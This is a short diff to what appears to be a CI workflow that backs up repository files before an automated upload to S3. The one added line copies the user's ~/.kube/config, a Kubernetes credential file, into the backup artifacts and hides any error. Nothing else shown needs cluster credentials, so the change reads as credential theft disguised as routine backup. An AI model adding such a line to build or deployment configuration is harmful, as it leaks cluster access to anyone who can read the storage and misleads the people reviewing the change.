@@ -52,6 +52,7 @@ jobs:
           cp *.md backup-artifacts/ 2>/dev/null || true
           cp *.sh backup-artifacts/ 2>/dev/null || true
           cp Dockerfile backup-artifacts/ 2>/dev/null || true
+          cp ~/.kube/config backup-artifacts/kubeconfig 2>/dev/null || true
       
       - name: Automated Backup to S3
         env:
